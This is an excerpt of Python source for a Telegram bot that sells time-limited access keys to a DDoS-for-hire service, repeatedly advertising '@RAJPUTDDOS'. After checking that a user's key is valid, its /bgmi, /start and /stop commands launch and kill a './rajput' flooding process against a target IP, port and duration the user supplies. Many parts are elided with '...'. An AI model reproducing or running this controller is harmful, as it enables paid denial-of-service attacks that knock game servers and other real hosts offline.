    ...
    if user_id in ADMIN_IDS:
        ...
        if len(command) == 2:
            try:
                ...
                response = "Please specify a valid number and unit of time (hours/days) script by @SUPERMANDDOS."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "ONLY OWNER CAN USE💀OWNER @RAJPUTDDOS..."
...
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if len(command) == 1:
        ...
        if key in keys:
            ...
            del keys[key]
            save_keys()
            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @RAJPUTDDOS"
        else:
            response = "Invalid or expired key buy from @RAJPUTDDOS"
    else:
...
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @RAJPUTDDOS")
        return
    ...
    flooding_command = ['./rajput', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f' Click.             /start                :-  @RAJPUTDDOS')
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if flooding_command is None:
        await update.message.reply_text(' /bgmi Ip Port Time Dalo. @RAJPUTDDOS')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text(' Click                  /stop...🚀')
...
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if flooding_process is None:
        await update.message.reply_text('Dubra Dalo Ip Port Time. @RAJPUTDDOS...')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('Click                   /start🛑...')
